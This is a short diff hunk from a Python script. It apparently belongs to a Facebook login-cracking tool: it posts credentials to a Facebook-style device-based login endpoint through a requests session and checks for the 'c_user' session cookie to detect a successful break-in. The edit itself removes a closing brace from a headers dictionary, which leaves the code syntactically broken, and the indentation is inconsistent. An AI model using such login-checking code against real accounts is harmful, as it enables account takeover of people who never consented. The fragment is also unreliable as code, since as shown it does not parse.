@@ -539,7 +539,7 @@ response = requests.get(
     headers=headers,
 )
     'user-agent': ua,
-    'viewport-width': '980',}
+    'viewport-width': '980'
 			lo = session.post(f'https://{mytd}/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
 			lcki=session.cookies.get_dict().keys()
 			if 'c_user' in lcki:
